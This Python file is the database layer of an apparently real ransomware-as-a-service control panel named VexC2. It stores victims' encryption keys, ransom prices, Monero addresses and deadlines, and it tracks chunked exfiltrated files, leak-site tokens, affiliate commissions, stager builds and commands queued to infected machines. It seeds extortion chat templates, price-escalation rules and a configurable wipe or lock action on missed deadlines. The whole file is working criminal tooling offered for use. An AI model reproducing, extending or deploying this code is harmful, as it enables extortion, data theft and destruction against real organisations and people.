"""VexC2 data layer — schema, migrations, events, settings, operators."""

import base64
import datetime
import glob
import hashlib
import hmac
import json
import os
import secrets
import sqlite3

import re
import subprocess
import threading

_AUDIT_LOCK = threading.Lock()


def _audit_key() -> bytes:
    raw = os.environ.get("VEX_AUDIT_KEY", "").strip()
    if raw:
        return raw.encode()
    raw = os.environ.get("VEX_SECRET", "").strip()
    if raw:
        return raw.encode()
    try:
        with open(os.path.join(APP_DIR, ".secret"), "rb") as fh:
            return fh.read().strip()
    except OSError:
        return b""


def _audit_anchor_path() -> str:
    return os.environ.get("VEX_AUDIT_ANCHOR", os.path.join(APP_DIR, ".audit_anchor"))


def _write_audit_anchor(last_id: int, last_hash: str) -> None:
    key = _audit_key()
    if not key or not last_hash:
        return
    payload = f"{last_id}|{last_hash}"
    sig = hmac.new(key, payload.encode(), hashlib.sha256).hexdigest()
    path = _audit_anchor_path()
    tmp = path + ".tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as fh:
            fh.write(payload + "\n" + sig + "\n")
            fh.flush()
            os.fsync(fh.fileno())
        os.replace(tmp, path)
    except OSError:
        try:
            os.unlink(tmp)
        except OSError:
            pass


def _read_audit_anchor():
    key = _audit_key()
    if not key:
        return None
    try:
        with open(_audit_anchor_path(), "r", encoding="utf-8") as fh:
            lines = fh.read().splitlines()
    except OSError:
        return None
    if len(lines) < 2:
        return False
    payload, sig = lines[0], lines[1]
    want = hmac.new(key, payload.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(want, sig):
        return False
    try:
        aid, ahash = payload.split("|", 1)
        return (int(aid), ahash)
    except ValueError:
        return False


APP_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.environ.get("VEX_DB", os.path.join(APP_DIR, "vex_c2.db"))
DB_URL = os.environ.get("VEX_DB_URL", "").strip()
IS_PG = DB_URL.startswith(("postgres://", "postgresql://"))

if IS_PG:
    import psycopg2
    import psycopg2.extras


class _PgConn:
    """Minimal adapter so the existing conn.execute(...) call sites work."""

    def __init__(self, conn):
        self._conn = conn

    def execute(self, sql, params=()):
        sql = sql.replace("INTEGER PRIMARY KEY AUTOINCREMENT", "SERIAL PRIMARY KEY")
        m = re.match(r"(?is)\s*INSERT\s+OR\s+IGNORE\s+INTO\s+(.*)$", sql)
        if m:
            sql = "INSERT INTO " + m.group(1).rstrip().rstrip(";") + " ON CONFLICT DO NOTHING"
        sql = sql.replace("?", "%s")
        cur = self._conn.cursor(cursor_factory=psycopg2.extras.DictCursor)
        cur.execute(sql, params)
        return cur

    def commit(self):
        self._conn.commit()

    def rollback(self):
        self._conn.rollback()

    def close(self):
        self._conn.close()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        if exc_type:
            self.rollback()
        else:
            self.commit()
        return False


def _columns(conn, table: str):
    if IS_PG:
        rows = conn.execute(
            "SELECT column_name FROM information_schema.columns "
            "WHERE table_name=%s ORDER BY ordinal_position", (table,)).fetchall()
        return [r[0] for r in rows]
    return [r[1] for r in conn.execute(f"PRAGMA table_info({table})")]


def _insert_id(conn, cur):
    if IS_PG:
        return int(conn.execute("SELECT LASTVAL()").fetchone()[0])
    return int(cur.lastrowid)

# Canonical column order. Templates use dict rows, so order is only a migration
# concern: older databases are rebuilt into exactly this shape.
VICTIM_COLUMNS = [
    "vid", "wrapped_key", "aes_key", "hostname", "username", "ip", "os_info",
    "timestamp", "status", "notes", "chat", "last_ping", "detonate", "pardon",
    "tags", "price", "xmr_address", "paid_at", "decrypter_built", "chat_unread",
    "deadline", "invoice_id", "sample_path", "sample_sha", "deadline_fired",
    "secret", "last_sig_ts", "auto_replied_at",
    "campaign_id", "assigned_to", "negotiation_step",
]

CREATE_VICTIMS = """CREATE TABLE IF NOT EXISTS victims (
    vid TEXT PRIMARY KEY,
    wrapped_key TEXT DEFAULT '',
    aes_key TEXT DEFAULT '',
    hostname TEXT DEFAULT '',
    username TEXT DEFAULT '',
    ip TEXT DEFAULT '',
    os_info TEXT DEFAULT '',
    timestamp TEXT DEFAULT '',
    status TEXT DEFAULT 'encrypted',
    notes TEXT DEFAULT '',
    chat TEXT DEFAULT '[]',
    last_ping TEXT DEFAULT '',
    detonate INTEGER DEFAULT 0,
    pardon INTEGER DEFAULT 0,
    tags TEXT DEFAULT '',
    price REAL DEFAULT 0,
    xmr_address TEXT DEFAULT '',
    paid_at TEXT DEFAULT '',
    decrypter_built INTEGER DEFAULT 0,
    chat_unread INTEGER DEFAULT 0,
    deadline TEXT DEFAULT '',
    invoice_id TEXT DEFAULT '',
    sample_path TEXT DEFAULT '',
    sample_sha TEXT DEFAULT '',
    deadline_fired INTEGER DEFAULT 0,
    secret TEXT DEFAULT '',
    last_sig_ts INTEGER DEFAULT 0,
    auto_replied_at TEXT DEFAULT '',
    campaign_id INTEGER DEFAULT 0,
    assigned_to TEXT DEFAULT '',
    negotiation_step TEXT DEFAULT 'first'
)"""

DEFAULT_TEMPLATES = {
    "first": ("Your data is encrypted and a copy has been extracted. "
              "Reply here to begin. Payment instructions are on the portal."),
    "deadline": ("The deadline on your invoice has passed. "
                 "Price escalation is now in effect."),
    "paid": "Payment received. Your decrypter is unlocked on the portal.",
    "proof": "Upload one encrypted sample through the portal so we can prove recovery.",
    "price": "The current amount is {amount}. Deadline: {deadline}.",
    "final": "Final notice: {deadline}. Invoice {invoice}.",
}

DEFAULT_SETTINGS = {
    "portal_title": "YOUR FILES ARE ENCRYPTED",
    "portal_intro": "Do not restart the machine or run third-party recovery tools.",
    "price_usd": "5000",
    "xmr_address": "YOUR_STATIC_XMR_ADDRESS_HERE",
    "proof_max_mb": "8",
    "proof_enabled": "1",
    # payments
    "payment_mode": "manual",          # manual | rpc
    "wallet_rpc_url": "http://127.0.0.1:18082/json_rpc",
    "wallet_rpc_user": "",
    "wallet_rpc_pass": "",
    "xmr_usd_rate": "0",               # 0 disables auto-verification
    # housekeeping
    "backup_keep": "7",
    "event_retention_days": "90",
    # campaign / routing
    "c2_host": "",                     # pushed to payloads on next ping
    "deadline_hours": "72",
    "escalate_1_hours": "24",
    "escalate_1_pct": "50",
    "escalate_2_hours": "72",
    "escalate_2_pct": "100",
    "auto_action": "none",           # none | lock | wipe
    "api_token": "",                  # when set, payloads must send X-Vex-Token
    "leak_enabled": "1",
    "leak_onion": "",
    "xmr_addresses": "",
    "exfil_max_mb": "512",
    "auto_reply": "0",
    "auto_reply_cooldown_hours": "24",
    "negotiation_enabled": "0",
    "session_idle_min": "60",
    "checkin_rate_per_min": "120",
    "require_2fa": "0",
    # root R2
    # PBKDF2 hash of the static step-up password; no TOTP enrollment required.
    "stepup_pass_hash": "pbkdf2$200000$eb054b9a59d9f36e9d7a27864b88b9da$bb43ed70e5d02d6e85a6cfaa29c8581e0678356f936f188099f1168a331ca02f",
    "lockdown": "0",
    "detonate_at": "",
    "deadman_hours": "0",
    "deadman_action": "none",
    "deadman_fired": "0",
    "root_last_seen": "",
    "audit_frozen": "0",
    # definitive panic
    "panic_pins": "",
    "panic_fail_count": "0",
    "panic_lock_until": "",
}


def now() -> str:
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def day_ago() -> str:
    return (datetime.datetime.now() - datetime.timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S")


def db() -> sqlite3.Connection:
    if IS_PG:
        return _PgConn(psycopg2.connect(DB_URL))
    conn = sqlite3.connect(DB_FILE, timeout=20)
    conn.row_factory = sqlite3.Row
    try:
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=20000")
    except sqlite3.Error:
        pass
    return conn


def _table_exists(conn, name: str) -> bool:
    if IS_PG:
        return conn.execute(
            "SELECT 1 FROM information_schema.tables WHERE table_name=%s",
            (name,)).fetchone() is not None
    return conn.execute(
        "SELECT 1 FROM sqlite_master WHERE type='table' AND name=?",
        (name,)).fetchone() is not None


def _migrate(conn: sqlite3.Connection) -> None:
    if IS_PG:
        cols = _columns(conn, "victims")
        if cols and cols != VICTIM_COLUMNS:
            raise RuntimeError(
                "automatic Postgres victims migration is unsupported; "
                "export, migrate offline and verify before starting")
        return
    cols = _columns(conn, "victims")
    if not cols:
        if _table_exists(conn, "victims_old"):
            conn.execute("ALTER TABLE victims_old RENAME TO victims")
            print("[*] recovered interrupted victims migration")
        return
    if cols == VICTIM_COLUMNS:
        return
    if _table_exists(conn, "victims_old"):
        raise RuntimeError(
            "victims_old exists alongside victims; manual recovery required "
            "before the panel can start")

    src = set(cols)

    def pick(target, default, *aliases):
        for name in (target,) + aliases:
            if name in src:
                return "COALESCE({}, {})".format(name, default)
        return default

    exprs = [
        pick("vid", "''"),
        pick("wrapped_key", "''"),
        pick("aes_key", "''"),
        pick("hostname", "''"),
        pick("username", "''"),
        pick("ip", "''"),
        pick("os_info", "''", "os"),
        pick("timestamp", "''"),
        pick("status", "'encrypted'"),
        pick("notes", "''"),
        pick("chat", "'[]'"),
        pick("last_ping", "''"),
        pick("detonate", "0"),
        pick("pardon", "0"),
        pick("tags", "''"),
        pick("price", "0"),
        pick("xmr_address", "''"),
        pick("paid_at", "''"),
        pick("decrypter_built", "0"),
        pick("chat_unread", "0"),
        pick("deadline", "''"),
        pick("invoice_id", "''"),
        pick("sample_path", "''"),
        pick("sample_sha", "''"),
        pick("deadline_fired", "0"),
        pick("secret", "''"),
        pick("last_sig_ts", "0"),
        pick("auto_replied_at", "''"),
        pick("campaign_id", "0"),
        pick("assigned_to", "''"),
        pick("negotiation_step", "'first'"),
    ]

    # Build and populate a fresh table first. The live table is untouched
    # until the row count and the copy are verified.
    conn.execute("DROP TABLE IF EXISTS victims_new")
    conn.execute(CREATE_VICTIMS.replace(
        "CREATE TABLE IF NOT EXISTS victims",
        "CREATE TABLE IF NOT EXISTS victims_new", 1))
    conn.execute(
        "INSERT INTO victims_new ({}) SELECT {} FROM victims".format(
            ", ".join(VICTIM_COLUMNS), ", ".join(exprs)))
    old_count = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
    new_count = conn.execute("SELECT COUNT(*) FROM victims_new").fetchone()[0]
    if old_count != new_count:
        conn.execute("DROP TABLE victims_new")
        raise RuntimeError(
            f"victims migration row-count mismatch ({old_count} -> {new_count}); "
            "live table left unchanged")
    conn.execute("ALTER TABLE victims RENAME TO victims_old")
    conn.execute("ALTER TABLE victims_new RENAME TO victims")
    conn.execute("DROP TABLE victims_old")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_victims_status "
                 "ON victims(status, timestamp)")
    print(f"[*] migrated victims table ({len(cols)} -> {len(VICTIM_COLUMNS)} columns)")


def init_db() -> None:
    with db() as conn:
        if not IS_PG and _table_exists(conn, "victims_old") \
                and not _table_exists(conn, "victims"):
            conn.execute("ALTER TABLE victims_old RENAME TO victims")
            print("[*] recovered interrupted victims migration")
        conn.execute(CREATE_VICTIMS)
        conn.execute("""CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ts TEXT, actor TEXT, kind TEXT, vid TEXT, detail TEXT,
            prev_hash TEXT DEFAULT '', hash TEXT DEFAULT '',
            hmac TEXT DEFAULT '')""")
        conn.execute("""CREATE TABLE IF NOT EXISTS settings (
            k TEXT PRIMARY KEY, v TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS operators (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            pw_hash TEXT NOT NULL,
            role TEXT NOT NULL DEFAULT 'admin',
            commission_pct REAL DEFAULT 0,
            totp_secret TEXT DEFAULT '',
            backup_codes TEXT DEFAULT '',
            shadow INTEGER DEFAULT 0,
            created TEXT, last_login TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS reports (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            vid TEXT, kind TEXT, detail TEXT, host TEXT, user TEXT, ts TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            vid TEXT NOT NULL, ctype TEXT NOT NULL, arg TEXT DEFAULT '',
            status TEXT DEFAULT 'pending', output TEXT DEFAULT '',
            created TEXT, updated TEXT,
            attempts INTEGER DEFAULT 0, max_attempts INTEGER DEFAULT 3,
            timeout_s INTEGER DEFAULT 300, priority INTEGER DEFAULT 0,
            dispatched_at TEXT DEFAULT '', error TEXT DEFAULT '')""")
        conn.execute("""CREATE TABLE IF NOT EXISTS templates (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE NOT NULL, body TEXT DEFAULT '',
            kind TEXT DEFAULT 'chat', updated TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            vid TEXT NOT NULL, amount REAL DEFAULT 0,
            note TEXT DEFAULT '', txid TEXT DEFAULT '',
            actor TEXT DEFAULT '', affiliate TEXT DEFAULT '', ts TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS payouts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            operator TEXT NOT NULL, amount REAL DEFAULT 0,
            note TEXT DEFAULT '', actor TEXT DEFAULT '', ts TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            vid TEXT NOT NULL, sender TEXT NOT NULL, operator TEXT DEFAULT '',
            body TEXT DEFAULT '', ts TEXT, read_admin INTEGER DEFAULT 0,
            read_victim INTEGER DEFAULT 0, attachment TEXT DEFAULT '')""")
        conn.execute("""CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT UNIQUE NOT NULL,
            note TEXT DEFAULT '', active INTEGER DEFAULT 1, created TEXT,
            config TEXT DEFAULT '{}')""")
        conn.execute("""CREATE TABLE IF NOT EXISTS artifacts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            campaign_id INTEGER DEFAULT 0, kind TEXT DEFAULT '',
            name TEXT DEFAULT '', sha256 TEXT DEFAULT '', path TEXT DEFAULT '',
            created TEXT, active INTEGER DEFAULT 1)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS exfil_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT, vid TEXT NOT NULL,
            name TEXT DEFAULT '', size INTEGER DEFAULT 0, sha256 TEXT DEFAULT '',
            total INTEGER DEFAULT 1, received INTEGER DEFAULT 0,
            status TEXT DEFAULT 'open', created TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS exfil_chunks (
            file_id INTEGER NOT NULL, idx INTEGER NOT NULL, sha256 TEXT DEFAULT '',
            path TEXT DEFAULT '', created TEXT,
            PRIMARY KEY (file_id, idx))""")
        conn.execute("""CREATE TABLE IF NOT EXISTS invoices (
            id INTEGER PRIMARY KEY AUTOINCREMENT, vid TEXT NOT NULL,
            number TEXT UNIQUE NOT NULL, amount REAL DEFAULT 0,
            status TEXT DEFAULT 'open', created TEXT, updated TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS campaign_builds (
            id INTEGER PRIMARY KEY AUTOINCREMENT, campaign_id INTEGER NOT NULL,
            status TEXT DEFAULT 'queued', log TEXT DEFAULT '',
            stager_path TEXT DEFAULT '', sha256 TEXT DEFAULT '',
            created TEXT, updated TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS leak_tokens (
            token TEXT PRIMARY KEY, vid TEXT NOT NULL, expires TEXT,
            created TEXT, used INTEGER DEFAULT 0, uses INTEGER DEFAULT 0,
            last_used TEXT DEFAULT '')""")
        conn.execute("""CREATE TABLE IF NOT EXISTS schema_migrations (
            version TEXT PRIMARY KEY, applied TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS uploads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            vid TEXT NOT NULL, name TEXT NOT NULL, size INTEGER DEFAULT 0,
            path TEXT NOT NULL, ts TEXT, sha256 TEXT DEFAULT '')""")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_victims_status "
                     "ON victims(status, timestamp)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_reports_vid ON reports(vid)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_commands_vid "
                     "ON commands(vid, status)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_uploads_vid ON uploads(vid)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_messages_vid "
                     "ON messages(vid, id)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_messages_unread "
                     "ON messages(read_admin)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_leak_vid ON leak_tokens(vid)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_invoices_vid ON invoices(vid)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_cbuild_campaign "
                     "ON campaign_builds(campaign_id, id)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_exfil_vid ON exfil_files(vid)")
        conn.execute("CREATE UNIQUE INDEX IF NOT EXISTS idx_payments_txid "
                     "ON payments(txid) WHERE txid <> ''")

        # command queue v2 columns for older databases
        cmd_cols = _columns(conn, "commands")
        for name, ddl in (("attempts", "INTEGER DEFAULT 0"),
                          ("max_attempts", "INTEGER DEFAULT 3"),
                          ("timeout_s", "INTEGER DEFAULT 300"),
                          ("priority", "INTEGER DEFAULT 0"),
                          ("dispatched_at", "TEXT DEFAULT ''"),
                          ("error", "TEXT DEFAULT ''")):
            if name not in cmd_cols:
                conn.execute(f"ALTER TABLE commands ADD COLUMN {name} {ddl}")
        for name, body in DEFAULT_TEMPLATES.items():
            conn.execute("INSERT OR IGNORE INTO templates (name, body, kind, updated) "
                         "VALUES (?,?,?,?)", (name, body, "chat", now()))
        conn.commit()

        _migrate(conn)

        # operator schema additions for older databases
        op_cols = _columns(conn, "operators")
        if "backup_codes" not in op_cols:
            conn.execute("ALTER TABLE operators ADD COLUMN backup_codes TEXT DEFAULT ''")
        if "commission_pct" not in op_cols:
            conn.execute("ALTER TABLE operators ADD COLUMN commission_pct REAL DEFAULT 0")
        if "shadow" not in op_cols:
            conn.execute("ALTER TABLE operators ADD COLUMN shadow INTEGER DEFAULT 0")
        up_cols = _columns(conn, "uploads")
        if "sha256" not in up_cols:
            conn.execute("ALTER TABLE uploads ADD COLUMN sha256 TEXT DEFAULT ''")
        lt_cols = _columns(conn, "leak_tokens")
        for name, ddl in (("uses", "INTEGER DEFAULT 0"),
                          ("last_used", "TEXT DEFAULT ''")):
            if name not in lt_cols:
                conn.execute(f"ALTER TABLE leak_tokens ADD COLUMN {name} {ddl}")
        ev_cols = _columns(conn, "events")
        for name, ddl in (("prev_hash", "TEXT DEFAULT ''"),
                          ("hash", "TEXT DEFAULT ''"),
                          ("hmac", "TEXT DEFAULT ''")):
            if name not in ev_cols:
                conn.execute(f"ALTER TABLE events ADD COLUMN {name} {ddl}")
        payout_cols = _columns(conn, "payouts")
        for name, ddl in (("status", "TEXT DEFAULT 'paid'"),
                          ("requested_by", "TEXT DEFAULT ''"),
                          ("updated", "TEXT DEFAULT ''")):
            if name not in payout_cols:
                conn.execute(f"ALTER TABLE payouts ADD COLUMN {name} {ddl}")
        pay_cols = _columns(conn, "payments")
        if "affiliate" not in pay_cols:
            conn.execute("ALTER TABLE payments ADD COLUMN affiliate TEXT DEFAULT ''")

        conn.execute("INSERT OR IGNORE INTO schema_migrations (version, applied) "
                     "VALUES (?, ?)", ("v3", now()))

        for k, v in DEFAULT_SETTINGS.items():
            conn.execute("INSERT OR IGNORE INTO settings (k, v) VALUES (?, ?)", (k, v))
        if not conn.execute("SELECT 1 FROM settings WHERE k='audit_last_hash'").fetchone():
            last = conn.execute("SELECT hash FROM events ORDER BY id DESC LIMIT 1").fetchone()
            conn.execute("INSERT INTO settings (k, v) VALUES ('audit_last_hash', ?)",
                         ((last["hash"] or "") if last and "hash" in last.keys() else "",))
        conn.execute("INSERT OR IGNORE INTO settings (k, v) VALUES ('audit_pruned_head', '')")
        akey = _audit_key()
        if akey:
            legacy = conn.execute(
                "SELECT id, hash FROM events WHERE hash!='' "
                "AND (hmac IS NULL OR hmac='')").fetchall()
            for row in legacy:
                ah = hmac.new(akey, (row["hash"] or "").encode(),
                              hashlib.sha256).hexdigest()
                conn.execute("UPDATE events SET hmac=? WHERE id=?",
                             (ah, row["id"]))
        last_ev = conn.execute(
            "SELECT id, hash FROM events ORDER BY id DESC LIMIT 1").fetchone()
        if last_ev and last_ev["hash"]:
            _write_audit_anchor(int(last_ev["id"]), last_ev["hash"])

        if not conn.execute("SELECT 1 FROM operators LIMIT 1").fetchone():
            pw = os.environ.get("VEX_PASS") or secrets.token_urlsafe(12)
            conn.execute(
                "INSERT INTO operators (username, pw_hash, role, created) VALUES (?,?,?,?)",
                ("admin", hash_password(pw), "admin", now()))
            if not os.environ.get("VEX_PASS"):
                print(f"[!] generated admin password: {pw}")
                print("[!] set VEX_PASS or change it under /admin/operators")

        # Root is seeded only from the environment and never created by the UI.
        # VEX_ROOT_USER exists so an operation can name the console account
        # without editing source; it defaults to the historical "root".
        root_user = os.environ.get("VEX_ROOT_USER", "root").strip() or "root"
        root_pw = os.environ.get("VEX_ROOT_PASS")
        if root_pw:
            has_root = conn.execute(
                "SELECT 1 FROM operators WHERE role='root' LIMIT 1").fetchone()
            if not has_root:
                conn.execute(
                    "INSERT INTO operators (username, pw_hash, role, created) "
                    "VALUES (?,?,?,?)", (root_user, hash_password(root_pw),
                                         "root", now()))
        conn.commit()


# ---------------------------------------------------------------------------
# settings / events
# ---------------------------------------------------------------------------
def get_setting(key: str, default: str = "") -> str:
    with db() as conn:
        row = conn.execute("SELECT v FROM settings WHERE k=?", (key,)).fetchone()
    return row["v"] if row and row["v"] is not None else default


def set_setting(key: str, value: str) -> None:
    with db() as conn:
        conn.execute(
            "INSERT INTO settings (k, v) VALUES (?, ?) "
            "ON CONFLICT(k) DO UPDATE SET v=excluded.v", (key, value))
        conn.commit()


def log_event(actor: str, kind: str, vid: str = "", detail: str = "") -> None:
    ts = now()
    with _AUDIT_LOCK:
        with db() as conn:
            if not IS_PG:
                try:
                    conn.execute("BEGIN IMMEDIATE")
                except sqlite3.Error:
                    pass
            prev = conn.execute("SELECT hash FROM events ORDER BY id DESC LIMIT 1").fetchone()
            prev_hash = (prev["hash"] or "") if prev and "hash" in prev.keys() else ""
            payload = f"{prev_hash}|{ts}|{actor}|{kind}|{vid}|{detail}"
            digest = hashlib.sha256(payload.encode("utf-8")).hexdigest()
            akey = _audit_key()
            ah = hmac.new(akey, digest.encode(), hashlib.sha256).hexdigest() if akey else ""
            conn.execute(
                "INSERT INTO events (ts, actor, kind, vid, detail, prev_hash, hash, hmac) "
                "VALUES (?,?,?,?,?,?,?,?)",
                (ts, actor, kind, vid, detail, prev_hash, digest, ah))
            cur = conn.execute("SELECT id FROM events ORDER BY id DESC LIMIT 1")
            new_id = int(cur.fetchone()[0])
            conn.execute(
                "INSERT INTO settings (k, v) VALUES ('audit_last_hash', ?) "
                "ON CONFLICT(k) DO UPDATE SET v=excluded.v", (digest,))
            conn.commit()
        _write_audit_anchor(new_id, digest)


def verify_audit_chain() -> tuple:
    """Recompute the hash chain. Legacy rows without a hash are skipped."""
    anchor = get_setting("audit_pruned_head", "")
    stored_head = get_setting("audit_last_hash", "")
    akey = _audit_key()
    with db() as conn:
        rows = conn.execute(
            "SELECT id, ts, actor, kind, vid, detail, prev_hash, hash, hmac "
            "FROM events ORDER BY id ASC").fetchall()
    last = anchor
    last_id = 0
    for r in rows:
        h = (r["hash"] or "") if "hash" in r.keys() else ""
        if not h:
            continue
        if akey and r["hmac"]:
            want = hmac.new(akey, h.encode(), hashlib.sha256).hexdigest()
            if not hmac.compare_digest(want, r["hmac"]):
                return False, r["id"]
        payload = f"{last}|{r['ts']}|{r['actor']}|{r['kind']}|{r['vid']}|{r['detail']}"
        if hashlib.sha256(payload.encode("utf-8")).hexdigest() != h:
            return False, r["id"]
        last = h
        last_id = r["id"]
    if stored_head and last != stored_head:
        return False, last_id
    anchor = _read_audit_anchor()
    if anchor is False:
        return False, last_id
    if anchor and (anchor[0] != last_id or anchor[1] != last):
        return False, last_id
    return True, 0


def recent_events(limit: int = 200, vid: str = "") -> list:
    with db() as conn:
        if vid:
            rows = conn.execute(
                "SELECT * FROM events WHERE vid=? ORDER BY id DESC LIMIT ?",
                (vid, limit)).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM events ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
    return rows


# ---------------------------------------------------------------------------
# victims
# ---------------------------------------------------------------------------
def get_victim(vid: str):
    with db() as conn:
        return conn.execute("SELECT * FROM victims WHERE vid=?", (vid,)).fetchone()


def push_message(vid: str, sender: str, body: str, operator: str = "",
                 attachment: str = "") -> int:
    body = (body or "")[:8000]
    ts = now()
    with db() as conn:
        cur = conn.execute(
            "INSERT INTO messages (vid, sender, operator, body, ts, attachment) "
            "VALUES (?,?,?,?,?,?)",
            (vid, sender, operator, body, ts, attachment))
        # Keep the legacy JSON column as a best-effort mirror for old clients.
        row = conn.execute("SELECT chat FROM victims WHERE vid=?", (vid,)).fetchone()
        if row:
            try:
                legacy = json.loads(row["chat"] or "[]")
            except Exception:
                legacy = []
            legacy.append({"sender": sender, "msg": body, "time": ts[11:16]})
            conn.execute("UPDATE victims SET chat=?, chat_unread=COALESCE(chat_unread,0)+? "
                         "WHERE vid=?",
                         (json.dumps(legacy), 0 if sender == "ADMIN" else 1, vid))
        conn.commit()
        return _insert_id(conn, cur)


def push_chat(vid: str, sender: str, message: str) -> None:
    push_message(vid, sender, message)


def messages_for(vid: str, since: int = 0, limit: int = 300) -> list:
    with db() as conn:
        rows = conn.execute(
            "SELECT id, sender, operator, body, ts, attachment FROM messages "
            "WHERE vid=? AND id>? ORDER BY id LIMIT ?",
            (vid, int(since), int(limit))).fetchall()
    out = []
    for r in rows:
        ts = r["ts"] or ""
        out.append({"id": r["id"], "sender": r["sender"], "operator": r["operator"] or "",
                    "msg": r["body"] or "", "time": ts[11:16], "ts": ts,
                    "attachment": r["attachment"] or ""})
    return out


def mark_messages_read(vid: str) -> None:
    with db() as conn:
        conn.execute("UPDATE messages SET read_admin=1 WHERE vid=? AND read_admin=0",
                     (vid,))
        conn.execute("UPDATE victims SET chat_unread=0 WHERE vid=?", (vid,))
        conn.commit()


def mark_chat_read(vid: str) -> None:
    mark_messages_read(vid)


def unread_admin(vid: str) -> int:
    with db() as conn:
        row = conn.execute("SELECT COUNT(*) FROM messages WHERE vid=? AND "
                           "read_admin=0 AND sender!='ADMIN'", (vid,)).fetchone()
    return int(row[0] or 0) if row else 0


def inbox(limit: int = 100) -> list:
    with db() as conn:
        rows = conn.execute(
            "SELECT m.*, v.hostname, v.status, v.chat_unread FROM messages m "
            "JOIN (SELECT vid, MAX(id) AS mid FROM messages GROUP BY vid) x "
            "ON m.id=x.mid LEFT JOIN victims v ON v.vid=m.vid "
            "ORDER BY m.id DESC LIMIT ?", (int(limit),)).fetchall()
    return rows


def online(row) -> bool:
    """Victim considered online if it pinged within the last 5 minutes."""
    if not row["last_ping"]:
        return False
    try:
        last = datetime.datetime.strptime(row["last_ping"], "%Y-%m-%d %H:%M:%S")
    except ValueError:
        return False
    return (datetime.datetime.now() - last).total_seconds() < 300


# ---------------------------------------------------------------------------
# passwords / TOTP
# ---------------------------------------------------------------------------
def hash_password(password: str, iterations: int = 200_000) -> str:
    salt = secrets.token_bytes(16)
    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations)
    return "pbkdf2${}${}${}".format(iterations, salt.hex(), digest.hex())


def verify_password(password: str, stored: str) -> bool:
    try:
        scheme, iters, salt_hex, hash_hex = stored.split("$")
        if scheme != "pbkdf2":
            return False
        iters_n = int(iters)
        if iters_n < 10_000 or iters_n > 1_000_000:
            return False
        digest = hashlib.pbkdf2_hmac(
            "sha256", password.encode(), bytes.fromhex(salt_hex), iters_n)
        return hmac.compare_digest(digest.hex(), hash_hex)
    except Exception:
        return False


def totp_code(secret_b32: str, at: int = None, step: int = 30, digits: int = 6) -> str:
    if at is None:
        at = int(__import__("time").time())
    counter = at // step
    key = base64.b32decode(secret_b32.upper() + "=" * ((8 - len(secret_b32) % 8) % 8))
    mac = hmac.new(key, counter.to_bytes(8, "big"), hashlib.sha1).digest()
    off = mac[-1] & 0x0F
    code = (int.from_bytes(mac[off:off + 4], "big") & 0x7FFFFFFF) % (10 ** digits)
    return str(code).zfill(digits)


def verify_totp(secret_b32: str, code: str, window: int = 1) -> bool:
    if not secret_b32:
        return False
    code = (code or "").strip()
    if not code.isdigit():
        return False
    import time
    base = int(time.time())
    for delta in range(-window, window + 1):
        if hmac.compare_digest(totp_code(secret_b32, base + delta * 30), code):
            return True
    return False


def new_totp_secret() -> str:
    return base64.b32encode(secrets.token_bytes(20)).decode().rstrip("=")


# ---------------------------------------------------------------------------
# housekeeping
# ---------------------------------------------------------------------------
def prune(retention_days: int) -> dict:
    cutoff = (datetime.datetime.now()
              - datetime.timedelta(days=max(1, retention_days))).strftime("%Y-%m-%d %H:%M:%S")
    with _AUDIT_LOCK:
        with db() as conn:
            dead = conn.execute(
                "SELECT hash FROM events WHERE ts < ? ORDER BY id DESC LIMIT 1",
                (cutoff,)).fetchone()
            anchor = (dead["hash"] or "") if dead and "hash" in dead.keys() else ""
            events = conn.execute("DELETE FROM events WHERE ts < ?", (cutoff,)).rowcount
            reports = conn.execute("DELETE FROM reports WHERE ts < ?", (cutoff,)).rowcount
            if events:
                conn.execute(
                    "INSERT INTO settings (k, v) VALUES ('audit_pruned_head', ?) "
                    "ON CONFLICT(k) DO UPDATE SET v=excluded.v", (anchor,))
            conn.commit()
    return {"events": events, "reports": reports}


